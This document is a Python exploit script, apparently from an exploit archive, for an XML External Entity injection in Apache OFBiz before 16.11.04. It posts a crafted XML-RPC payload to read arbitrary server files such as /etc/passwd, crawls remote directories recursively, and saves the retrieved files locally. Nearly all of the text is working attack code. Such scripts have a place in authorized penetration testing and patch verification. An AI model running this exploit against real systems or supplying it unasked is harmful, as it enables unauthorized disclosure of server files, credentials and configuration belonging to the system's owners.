# Exploit Author: Jamie Parfet
# Vendor Homepage: https://ofbiz.apache.org/
# Software Link: https://archive.apache.org/dist/ofbiz/
# Version: < 16.11.04
# Tested on: Ubuntu 18.04.1
# CVE: N/A
 
#!/usr/bin/env python3
# *****************************************************
# Type: XML External Entity Injection (File disclosure)
# Target: Apache OFBiz < 16.11.04
# Author: Jamie Parfet
# *****************************************************
import sys
import os
import requests
import urllib3
import re
import argparse
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
simple_payload = """<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://{}">]>
<methodCall><methodName>xXx
&disclose;xXx</methodName></methodCall>
"""
 
if len(sys.argv) <= 1:
    print(&#039;[*] Apache OFBiz < 16.11.04 XXE&#039;)
    print(&#039;[*] Use "%s -h" to display help.&#039; % (sys.argv[0]))
    exit(0)
 
 
parser = argparse.ArgumentParser()
parser.add_argument("-u",
                    metavar="https://localhost:8443",
                    dest="url",
                    required=True,
                    help="Target URL (required)",
                    action=&#039;store&#039;)
parser.add_argument("-f",
                    metavar="/etc/passwd",
                    dest="file",
                    help="Target file",
                    action=&#039;store&#039;)
parser.add_argument("-c",
                    metavar="/home/",
                    dest="crawl",
                    help="Target directory to start crawling from",
                    action=&#039;store&#039;)
parser.add_argument("-o",
                    metavar="~/local/output/directory/",
                    dest="output_dir",
                    help="Local directory that remote file will be saved to",
                    action=&#039;store&#039;)
args = parser.parse_args()
url = args.url if args.url else None
target_file = args.file if args.file else None
crawl_dir = args.crawl if args.crawl else None
output_dir = args.output_dir if args.output_dir else None
 
 
def check_url(url):
    if &#039;://&#039; not in url:
        print(&#039;[-] ERROR: Please include protocol in URL, such as https://{}&#039;.format(url))
        exit(0)
    else:
        return url
 
 
def request(url, payload):
    response = requests.post(url + &#039;/webtools/control/xmlrpc&#039;, data=payload, verify=False).text
    parsed_response = re.sub(r&#039;(.*xXx\n|xXx.*)&#039;, &#039;&#039;, response)
    return parsed_response
 
 
def crawl(crawl_dir):
    payload = simple_payload.format(crawl_dir)
    response = request(url, payload)
    payload_404 = simple_payload.format(crawl_dir + "/xX404Xx")
    response_404 = request(url, payload_404)
    if &#039;No such file or directory&#039; in response:
        print("[-] ERROR - 404: {}".format(crawl_dir))
    elif &#039;Permission denied&#039; in response or &#039;but is not accessible&#039; in response:
        print("[-] ERROR - Permission: {}".format(crawl_dir))
    elif &#039;Not a directory&#039; in response_404:
        print("[*] FILE: {}".format(crawl_dir))
    else:
        print("[*] DIR: {}".format(crawl_dir))
        for f in response.splitlines():
            full_path = (crawl_dir + &#039;/&#039; + f)
            crawl(full_path)
 
 
def main(url=url, target_file=target_file, crawl_dir=crawl_dir, output_dir=output_dir):
    if url:
        check_url(url)
        if crawl_dir:
            crawl(crawl_dir)
        else:
            payload = simple_payload.format(target_file)
            if output_dir:
                if os.path.isdir(output_dir):
                    result = request(url, payload)
                    remote_file_name = re.sub(&#039;/&#039;, &#039;--&#039;, target_file)
                    output_file = (output_dir + &#039;/&#039; + remote_file_name[2:])
                    file = open(output_file, &#039;w&#039;)
                    file.write(result)
                    file.close()
                else:
                    print("[-] ERROR: {} is not a writeable directory".format(output_dir))
            else:
                result = request(url, payload)
                print(result)
 
 
if __name__ == &#039;__main__&#039;:
    try:
        main()
    except KeyboardInterrupt:
        print(&#039;\nKeyboard interrupt detected.&#039;)
        print(&#039;Exiting...&#039;)
        exit(0)

